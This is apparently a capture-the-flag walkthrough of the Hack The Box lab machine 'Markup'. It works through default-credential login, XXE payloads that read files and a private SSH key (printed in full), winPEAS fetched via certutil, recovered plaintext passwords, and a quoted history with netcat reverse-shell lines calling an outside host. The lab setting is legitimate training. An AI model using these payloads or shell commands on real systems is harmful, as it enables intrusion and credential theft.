# Markup

URL: https://app.hackthebox.com/starting-point

Level: Very Easy

Start time: 23 Feb 2022, 4:38pm GMT+1

End time: 24 Feb 2022, 11:30pm GMT+1


## Walkthrough

### Enumeration

#### NMAP

Basic nmap scan:

```
# Nmap 7.92 scan initiated Wed Feb 23 16:35:53 2022 as: nmap -T4 -p- -oN 01_nmap 10.129.95.192
Nmap scan report for 10.129.95.192
Host is up (0.048s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

# Nmap done at Wed Feb 23 16:38:00 2022 -- 1 IP address (1 host up) scanned in 126.82 seconds
```

Again, with -sC -sV:

```
# Nmap 7.92 scan initiated Wed Feb 23 16:48:03 2022 as: nmap -T4 -p22,80,443 -sC -sV -oN 02_nmap 10.129.95.192
Nmap scan report for 10.129.95.192
Host is up (0.092s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MegaShopping
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-title: MegaShopping
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| tls-alpn:
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 23 16:48:25 2022 -- 1 IP address (1 host up) scanned in 21.58 seconds
```

On port 80 we have a simple login page. First try:

`admin:password`

and we are in.

On "order" page we can submit data, this is our request:

```
POST /process.php HTTP/1.1
Host: markup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 110
Origin: http://markup.htb
Connection: close
Referer: http://markup.htb/services.php
Cookie: PHPSESSID=mpfo4lqk8fv7gj0krvpclaa1aq

<?xml version = "1.0"?><order><quantity></quantity><item>Home Appliances</item><address>test</address></order>
```

We can try some XXE (XML External Entity) technique.

rif.

https://gitlab.com/pentest-tools/PayloadsAllTheThings/-/blob/master/XXE%20Injection/README.md

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

We try to grab `win.ini` file:

![markup2](https://user-images.githubusercontent.com/42389836/155619429-b0f84639-9789-4cec-a6fa-9d74d46a5167.png)

Ok, so this is working.

We can try to made a request to our malicious web server:

```
POST /process.php HTTP/1.1
Host: markup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 183
Origin: http://markup.htb
Connection: close
Referer: http://markup.htb/services.php
Cookie: PHPSESSID=mpfo4lqk8fv7gj0krvpclaa1aq

<?xml version = "1.0"?>
<!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "http://10.10.16.44/test" >]>
<order><quantity>31337</quantity><item>Medicine&xxe;</item><address></address></order>
```

Result:

```
root@kaligra:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.31 - - [24/Feb/2022 18:04:20] code 404, message File not found
10.129.227.31 - - [24/Feb/2022 18:04:20] "GET /test HTTP/1.0" 404 -
```

We can also try to access some SMB share (SYSTEM "\\10.10.16.44"), and hope for NTLM hashes, but this failed.

Last, we can also try to grab actual PHP code of some page, eg.

```
POST /process.php HTTP/1.1
Host: markup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 241
Origin: http://markup.htb
Connection: close
Referer: http://markup.htb/services.php
Cookie: PHPSESSID=mpfo4lqk8fv7gj0krvpclaa1aq

<?xml version = "1.0"?>
<!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://10.129.227.31/process.php" >]>
<order><quantity>31337</quantity><item>Medicine&xxe;</item><address></address></order>
```

Response:

```
HTTP/1.1 200 OK
Date: Thu, 24 Feb 2022 17:38:29 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 16178

Your order for MedicineICAgIDwhRE9DVFlQRSBodG1sPg0KICAgIDxodG1sIGxhbmc9ImVuIj4NCiAgICA8aGVhZD4NCiAgICAgICAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KICAgICAgICA8dGl0bGU+TWVnYVNob3BwaW5nPC90aXRsZT4NCiAgICAgICAgPGxpbmsgcmVsPSdzdHlsZXNoZWV0JyBocmVmPSdodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9T3BlbitTYW5zJz4NCiAgICAgICAgPHN0eWxlPg0KICAgICAgICAgICAgLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8NCiAgICAgICAgICAgIC8qIEZvb3RlciAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICovDQogICAgICAgICAgICAvKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqLw0KDQogICAgICAgICAgICAjZm9vdGVyDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcGFkZGluZzogOGVtIDBlbSA1ZW0gMGVtOw0KICAgICAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgKiwgKjpiZWZvcmUsICo6YWZ0ZXIgew0KICAgICAgICAgICAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7DQogICAgICAgICAgICAgICAgbWFyZ2luOiAwOw0KICAgICAgICAgICAgICAgIHBhZGRpbmc6IDA7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGJvZHkgew0KICAgICAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnT3BlbiBTYW5zJywgSGVsdmV0aWNhLCBBcmlhbCwgc2Fucy1zZXJpZjsNCiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiAjZWRlZGVkOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBpbnB1dCwgYnV0dG9uIHsNCiAgICAgICAgICAgICAgICBib3JkZXI6IG5vbmU7DQogICAgICAgICAgICAgICAgb3V0bGluZTogbm9uZTsNCiAgICAgICAgICAgICAgICBiYWNrZ
..
..
..
..
```

Then we can decode it with:

```
echo -n "VERY-LONG-STRING" | base64 -d
```

### User Flag

With XXE technique, we can grab user flag:

```
POST /process.php HTTP/1.1
Host: markup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 200
Origin: http://markup.htb
Connection: close
Referer: http://markup.htb/services.php
Cookie: PHPSESSID=mpfo4lqk8fv7gj0krvpclaa1aq

<?xml version = "1.0"?>
<!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "file:///c:/users/Daniel/Desktop/user.txt" >]>
<order><quantity>31337</quantity><item>Medicine&xxe;</item><address></address></order>







HTTP/1.1 200 OK
Date: Thu, 24 Feb 2022 19:05:56 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 76
Connection: close
Content-Type: text/html; charset=UTF-8

Your order for Medicine032d2fc8952a8c24e39c8f0ee9918ef7
 has been processed
```

Since we got port 22/TCP, we look for something on user "Daniel", and we found his private SSH key:

```
POST /process.php HTTP/1.1
Host: markup.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml
Content-Length: 195
Origin: http://markup.htb
Connection: close
Referer: http://markup.htb/services.php
Cookie: PHPSESSID=mpfo4lqk8fv7gj0krvpclaa1aq

<?xml version = "1.0"?>
<!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "file:///c:/users/Daniel/.ssh/id_rsa" >]>
<order><quantity>31337</quantity><item>Medicine&xxe;</item><address></address></order>
```

```
HTTP/1.1 200 OK
Date: Thu, 24 Feb 2022 19:13:41 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 2644
Connection: close
Content-Type: text/html; charset=UTF-8

Your order for Medicine-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEArJgaPRF5S49ZB+Ql8cOhnURSOZ4nVYRSnPXo6FIe9JnhVRrdEiMi
QZoKVCX6hIWp7I0BzN3o094nWInXYqh2oz5ijBqrn+NVlDYgGOtzQWLhW7MKsAvMpqM0fg
HYC5nup5qM8LYDyhLQ56j8jq5mhvEspgcDdGRy31pljOQSYDeAKVfiTOOMznyOdY/Klt6+
ca+7/6ze8LTD3KYcUAqAxDINaZnNrG66yJU1RygXBwKRMEKZrEviLB7dzLElu3kGtiBa0g
DUqF/SVkE/tKGDH+XrKl6ltAUKfald/nqJrZbjDieplguocXwbFugIkyCc+eqSyaShMVk3
PKmZCo3ddxfmaXsPTOUpohi4tidnGO00H0f7Vt4v843xTWC8wsk2ddVZZV41+ES99JMlFx
LoVSXtizaXYX6l8P+FuE4ynam2cRCqWuislM0XVLEA+mGznsXeP1lNL+0eaT3Yt/TpfkPH
3cUU0VezCezxqDV6rs/o333JDf0klkIRmsQTVMCVAAAFiGFRDhJhUQ4SAAAAB3NzaC1yc2
EAAAGBAKyYGj0ReUuPWQfkJfHDoZ1EUjmeJ1WEUpz16OhSHvSZ4VUa3RIjIkGaClQl+oSF
qeyNAczd6NPeJ1iJ12KodqM+Yowaq5/jVZQ2IBjrc0Fi4VuzCrALzKajNH4B2AuZ7qeajP
C2A8oS0Oeo/I6uZobxLKYHA3Rkct9aZYzkEmA3gClX4kzjjM58jnWPypbevnGvu/+s3vC0
w9ymHFAKgMQyDWmZzaxuusiVNUcoFwcCkTBCmaxL4iwe3cyxJbt5BrYgWtIA1Khf0lZBP7
Shgx/l6ypepbQFCn2pXf56ia2W4w4nqZYLqHF8GxboCJMgnPnqksmkoTFZNzypmQqN3XcX
5ml7D0zlKaIYuLYnZxjtNB9H+1beL/ON8U1gvMLJNnXVWWVeNfhEvfSTJRcS6FUl7Ys2l2
F+pfD/hbhOMp2ptnEQqlrorJTNF1SxAPphs57F3j9ZTS/tHmk92Lf06X5Dx93FFNFXswns
8ag1eq7P6N99yQ39JJZCEZrEE1TAlQAAAAMBAAEAAAGAJvPhIB08eeAtYMmOAsV7SSotQJ
HAIN3PY1tgqGY4VE4SfAmnETvatGGWqS01IAmmsxuT52/B52dBDAt4D+0jcW5YAXTXfStq
mhupHNau2Xf+kpqS8+6FzqoQ48t4vg2Mvkj0PDNoIYgjm9UYwv77ZsMxp3r3vaIaBuy49J
ZYy1xbUXljOqU0lzmnUUMVnv1AkBnwXSDf5AV4GulmhG4KZ71AJ7AtqhgHkdOTBa83mz5q
FDFDy44IyppgxpzIfkou6aIZA/rC7OeJ1Z9ElufWLvevywJeGkpOBkq+DFigFwd2GfF7kD
1NCEgH/KFW4lVtOGTaY0V2otR3evYZnP+UqRxPE62n2e9UqjEOTvKiVIXSqwSExMBHeCKF
+A5JZn45+sb1AUmvdJ7ZhGHhHSjDG0iZuoU66rZ9OcdOmzQxB67Em6xsl+aJp3v8HIvpEC
sfm80NKUo8dODlkkOslY4GFyxlL5CVtE89+wJUDGI0wRjB1c64R8eu3g3Zqqf7ocYVAAAA
wHnnDAKd85CgPWAUEVXyUGDE6mTyexJubnoQhqIzgTwylLZW8mo1p3XZVna6ehic01dK/o
1xTBIUB6VT00BphkmFZCfJptsHgz5AQXkZMybwFATtFSyLTVG2ZGMWvlI3jKwe9IAWTUTS
IpXkVf2ozXdLxjJEsdTno8hz/YuocEYU2nAgzhtQ+KT95EYVcRk8h7N1keIwwC6tUVlpt+
yrHXm3JYU25HdSv0TdupvhgzBxYOcpjqY2GA3i27KnpkIeRQAAAMEA2nxxhoLzyrQQBtES
h8I1FLfs0DPlznCDfLrxTkmwXbZmHs5L8pP44Ln8v0AfPEcaqhXBt9/9QU/hs4kHh5tLzR
Fl4Baus1XHI3RmLjhUCOPXabJv5gXmAPmsEQ0kBLshuIS59X67XSBgUvfF5KVpBk7BCbzL
mQcmPrnq/LNXVk8aMUaq2RhaCUWVRlAoxespK4pZ4ffMDmUe2RKIVmNJV++vlhC96yTuUQ
S/58hZP3xlNRwlfKOw1LPzjxqhY+vzAAAAwQDKOnpm/2lpwJ6VjOderUQy67ECQf339Dvy
U9wdThMBRcVpwdgl6z7UXI00cja1/EDon52/4yxImUuThOjCL9yloTamWkuGqCRQ4oSeqP
kUtQAh7YqWil1/jTCT0CujQGvZhxyRfXgbwE6NWZOEkqKh5+SbYuPk08kB9xboWWCEOqNE
vRCD2pONhqZOjinGfGUMml1UaJZzxZs6F9hmOz+WAek89dPdD4rBCU2fS3J7bs9Xx2PdyA
m3MVFR4sN7a1cAAAANZGFuaWVsQEVudGl0eQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
 has been processed
```

So, we are in:

```
root@kaligra:/opt/htb-startingpoint/Markup# ssh -i ./16_key daniel@markup.htb
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\daniel

10/13/2021  03:43 PM    <DIR>          .
10/13/2021  03:43 PM    <DIR>          ..
03/05/2020  05:19 AM    <DIR>          .ssh
03/05/2020  06:18 AM    <DIR>          Desktop
04/21/2020  02:34 AM    <DIR>          Documents
09/14/2018  11:12 PM    <DIR>          Downloads
09/14/2018  11:12 PM    <DIR>          Favorites
09/14/2018  11:12 PM    <DIR>          Links
09/14/2018  11:12 PM    <DIR>          Music
09/14/2018  11:12 PM    <DIR>          Pictures
09/14/2018  11:12 PM    <DIR>          Saved Games
09/14/2018  11:12 PM    <DIR>          Videos
               0 File(s)              0 bytes
              12 Dir(s)   7,376,375,808 bytes free

daniel@MARKUP C:\Users\daniel>
```

### WinPEAS

At this point, we transfer `winPEAS.bat` on target machine through `certutil.exe`:

```
certutil.exe -urlcache -f http://10.10.16.44/winPEAS.bat winPEAS.bat
```

```
root@kaligra:/opt/htb-startingpoint/Markup# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.95.192 - - [24/Feb/2022 23:22:22] "GET /winPEAS.bat HTTP/1.1" 200 -
```

We execute winPEAS:


![markup](https://user-images.githubusercontent.com/42389836/155620585-57a81341-6b62-4ba6-b051-7e0822c36c44.JPG)

We let winPEAS run for a while and we discover actual Daniel's passowrd:

```
..
..
$pass = ConvertTo-SecureString "YAkpPzX2V_%" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("daniel",$pass)
..
..
```

And also Administrator credential in "history":

```
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
    DefaultDomainName    REG_SZ
    DefaultUserName    REG_SZ    Administrator
    DefaultPassword    REG_SZ    Yhk}QE&j<3M
    LastUsedUsername    REG_SZ    Administrator
```

### Root flag

At this point, we can access through SSH:


```
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

administrator@MARKUP C:\Users\Administrator>whoami
markup\administrator

administrator@MARKUP C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\Administrator

10/13/2021  03:43 PM    <DIR>          .
10/13/2021  03:43 PM    <DIR>          ..
03/05/2020  04:11 AM    <DIR>          3D Objects
03/05/2020  04:11 AM    <DIR>          Contacts
03/05/2020  06:33 AM    <DIR>          Desktop
04/21/2020  03:16 AM    <DIR>          Documents
03/05/2020  04:11 AM    <DIR>          Downloads
03/05/2020  04:11 AM    <DIR>          Favorites
03/05/2020  04:11 AM    <DIR>          Links
03/05/2020  04:11 AM    <DIR>          Music
03/05/2020  04:11 AM    <DIR>          Pictures
03/05/2020  04:11 AM    <DIR>          Saved Games
03/05/2020  04:11 AM    <DIR>          Searches
03/05/2020  04:11 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   7,388,598,272 bytes free

administrator@MARKUP C:\Users\Administrator>cd Desktop

administrator@MARKUP C:\Users\Administrator\Desktop>type root.txt
f574a3e7650cebd8c39784299cb570f8

administrator@MARKUP C:\Users\Administrator\Desktop>
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

administrator@MARKUP C:\Users\Administrator>whoami
markup\administrator

administrator@MARKUP C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\Administrator

10/13/2021  03:43 PM    <DIR>          .
10/13/2021  03:43 PM    <DIR>          ..
03/05/2020  04:11 AM    <DIR>          3D Objects
03/05/2020  04:11 AM    <DIR>          Contacts
03/05/2020  06:33 AM    <DIR>          Desktop
04/21/2020  03:16 AM    <DIR>          Documents
03/05/2020  04:11 AM    <DIR>          Downloads
03/05/2020  04:11 AM    <DIR>          Favorites
03/05/2020  04:11 AM    <DIR>          Links
03/05/2020  04:11 AM    <DIR>          Music
03/05/2020  04:11 AM    <DIR>          Pictures
03/05/2020  04:11 AM    <DIR>          Saved Games
03/05/2020  04:11 AM    <DIR>          Searches
03/05/2020  04:11 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   7,388,598,272 bytes free

administrator@MARKUP C:\Users\Administrator>cd Desktop

administrator@MARKUP C:\Users\Administrator\Desktop>type root.txt
f574a3e7650cebd8c39784299cb570f8

administrator@MARKUP C:\Users\Administrator\Desktop>
```

### Other infos:

Through winPEAS we discover `ConsoleHost_history.txt` with hints on some other path:

```
daniel@MARKUP C:\Users\daniel>type C:\Users\daniel\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cd Desktop
ls
cd C:
ls
cd C:\
ls
cd .\Log-Management\
ls
more .\job.bat
wget http://10.10.14.2/nc.exe -o nc.exe
ls
move nc.exe C:\USERS\daniel\nc.exe
ls
echo echo 1 > job.bat
ls
cat job.bat
echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe & C:\Log-Management\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe \& C:\Log-Management\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe /& C:\Log-Management\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe \&\& C:\Log-Management\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe \n C:\Log-Management\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
echo wget http://10.10.14.2/nc.exe -O C:\Log-Management\nc.exe \n C:\Log-Management\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
cat .\job.bat
ls
nano .\job.bat
more .\job.bat
ls -al
dir
echo C:\Users\daniel\nc.exe -e cmd.exe 10.10.14.2 1234 > .\job.bat
echo "C:\Users\daniel\nc.exe -e cmd.exe 10.10.14.2 1234" > .\job.bat
cat .\job.bat
wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
ls
echo "C:\Users\daniel\nc.exe -e cmd.exe 10.10.14.2 1234" > .\job.bat
wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
ls
wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
ls
wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
ls
wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
$pass = ConvertTo-SecureString "YAkpPzX2V_%" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("daniel",$pass)
Start-Process -NoNewWindow -FilePath "C:\xampp\xampp_start.exe" -Credential $cred -WorkingDirectory c:\users\daniel\documents
exit
```

In c:\Log-Management there is a job.bat, probably executed with Scheduled task as Administrator.

```
daniel@MARKUP c:\Log-Management>type job.bat 
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
daniel@MARKUP c:\Log-Management>
```






